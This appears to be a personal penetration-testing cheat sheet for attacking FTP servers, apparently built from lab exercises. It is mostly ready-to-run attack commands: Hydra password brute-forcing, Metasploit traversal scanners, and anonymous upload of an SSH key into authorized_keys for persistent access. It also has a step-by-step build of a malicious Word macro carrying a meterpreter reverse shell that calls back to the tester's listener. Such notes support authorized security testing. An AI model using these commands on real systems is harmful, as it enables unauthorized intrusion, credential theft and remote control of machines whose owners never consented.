# Pennotes

This repository are notes that I use on pentests. If you don't understand, remember, this was not written for you.

## FTP 21

Enumeration one liners

**#Checklist**

```
$ Anonymous login
$ OS version
$ Other software you can find on the machine (Prog Files, yum.log, /bin)
$ password files
$ DLLs for msfpescan / BOF targets
$ Do you have UPLOAD potential?
$ Can you trigger execution of uploads?
$ Swap binaries?
$ Public exploits for ftp server software
```

**#download all dirs and files**

```
wget --mirror 'ftp://ftp_user:redcliff@10.10.10.59'
```

**#if PASV transfer is disabled**

```
wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98'
```

**#If PASV is enabled**

```
sudo wget --mirror 'ftp://anonymous:anonymous@10.11.1.14'
```

**#Grab FTP Banner via telnet**

```
telnet -n 192.168.101.100 21
```

**#Grab FTP Certificate if existing**

```
openssl s_client -connect 192.168.101.100:21 -starttls ftp
```

**#nmap ftp**

```
nmap --script ftp-* -p 21 192.168.101.100
nmap -sC -sV 192.168.101.162 --script=ftp-anon

#Alternative without bruteforcing

nmap -p 21 --script="+ftp and not brute and not dos and not fuzzer" -vv -oN ftp > $ip
```

**#Connect with Browser**

```
ftp://anonymous:anonymous@192.168.101.100
```

**#Hydra Brute Force (Need Username)**

```
hydra -t 1 -l motherfucker -P rockyou.txt -vV 192.168.101.100 ftp
Hydra with Sparta custom list (need to download sparta )
hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f > $ip ftp
```

**#Msfconsole one liner**

```
msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit'
```

\#Possibly **upload kali generated ssh-keys and deploy into target,** then ssh directly into user

```
ssh-keygen
ftp 10.10.10.10 anonymous:anonymous
put /root/.ssh/id_rsa.pub authorized_keys
ssh user@10.10.10.10

#If ftp enters passive mode at login , good indication of the presence 
of a firewall in the system
```

**#MS Office evil macro reverse shell (Uploaded on ftp)**

**First stage:**

1. msfconsole --→ search office macro
2. use /multi/fileformat/office\_word\_macro --→ show options
3. set meterpreter reverse listener

set payload windows/meterpreter/reverse\_tcp

4\)set listening host (kali) and disable payload handler

set lhost 192.168.119.177 #lport automatically set as 4444

set disablepayloadhandler false

run

**Second stage:**

File stored at : /home/kali/.msf4/local/msf.docm

1\)Change extension from .docm to .doc sudo mv msf.docm msf.doc

2\)Start meterpreter listener

set payload windows/meterpreter/reverse\_tcp set exitonsession false set lhost 192.168.119.177 set lport 4444 run -j

2\)use put command to upload ftp 10.10.10.10 21 put msf.doc exit

3\)Catch meterpreter session
